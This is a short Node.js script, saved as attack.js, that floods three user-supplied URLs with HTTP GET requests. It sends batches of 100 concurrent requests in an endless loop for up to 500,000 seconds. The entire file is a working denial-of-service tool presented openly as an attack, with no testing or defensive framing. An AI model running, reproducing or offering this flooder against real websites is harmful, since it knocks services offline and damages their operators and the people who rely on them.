const axios = require('axios');

const target1 = process.argv[2];
const target2 = process.argv[3];
const target3 = process.argv[4];
const durationSeconds = parseInt(process.argv[5]); // in SECONDS

if (!target1 || !target2 || !target3 || isNaN(durationSeconds) || durationSeconds <= 0 || durationSeconds > 500000) {
  console.error('Usage: node attack.js <target1> <target2> <target3> <duration_in_seconds>');
  process.exit(1);
}

const MAX_TIMEOUT = 25000;
const CONCURRENT_REQUESTS = 100;
const targets = [target1, target2, target3];

let isRunning = true;

async function sendRequest(url, id) {
  try {
    const res = await axios.get(url, { timeout: MAX_TIMEOUT });
    console.log(`[${url}] #${id} - ${res.status}`);
  } catch (err) {
    console.log(`[${url}] #${id} - Error: ${err.message}`);
  }
}

async function attackLoop() {
  let requestCount = 0;

  while (isRunning) {
    const batch = [];

    for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
      const url = targets[i % targets.length]; // rotate through targets
      requestCount++;
      batch.push(sendRequest(url, requestCount));
    }

    await Promise.allSettled(batch);
  }
}

// Auto-stop after duration (converted to ms)
setTimeout(() => {
  console.log(`Attack finished after ${durationSeconds} seconds`);
  isRunning = false;
}, durationSeconds * 1000);

attackLoop();
